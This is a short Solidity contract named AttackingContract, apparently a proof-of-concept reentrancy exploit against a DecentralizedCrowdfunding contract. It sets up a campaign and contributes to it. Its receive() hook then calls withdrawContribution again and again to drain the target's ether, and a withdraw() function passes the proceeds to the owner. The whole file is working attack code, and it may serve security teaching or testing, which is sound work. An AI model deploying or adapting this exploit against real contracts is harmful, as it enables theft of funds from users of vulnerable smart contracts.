// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.23;

import "openzeppelin-contracts/contracts/access/Ownable.sol";
import "openzeppelin-contracts/contracts/utils/Address.sol";
import "./IDecentralizedCrowdfunding.sol";

contract AttackingContract is Ownable {
    using Address for address payable;

    IDecentralizedCrowdfunding private immutable decentralizedCrowdfunding;

    uint256 private myCampaignId;
    uint256 private myContribution;

    constructor(address _decentralizedCrowdfundingAddress) Ownable(msg.sender) {
        decentralizedCrowdfunding = IDecentralizedCrowdfunding(_decentralizedCrowdfundingAddress);
    }

    function prepareAttack(uint256 goal, uint256 duration) external payable onlyOwner {
        decentralizedCrowdfunding.createCampaign(goal, duration);
        myCampaignId = decentralizedCrowdfunding.numCampaigns();
        decentralizedCrowdfunding.contribute{value: msg.value}(myCampaignId);
        myContribution += msg.value;
    }

    function attack() external payable {
        decentralizedCrowdfunding.withdrawContribution(myCampaignId);
    }
    
    function withdraw() external onlyOwner {
        payable(msg.sender).sendValue(address(this).balance);
    }

    receive() external payable {
        if (address(decentralizedCrowdfunding).balance >= myContribution) {
            decentralizedCrowdfunding.withdrawContribution(myCampaignId);
        }
    }
}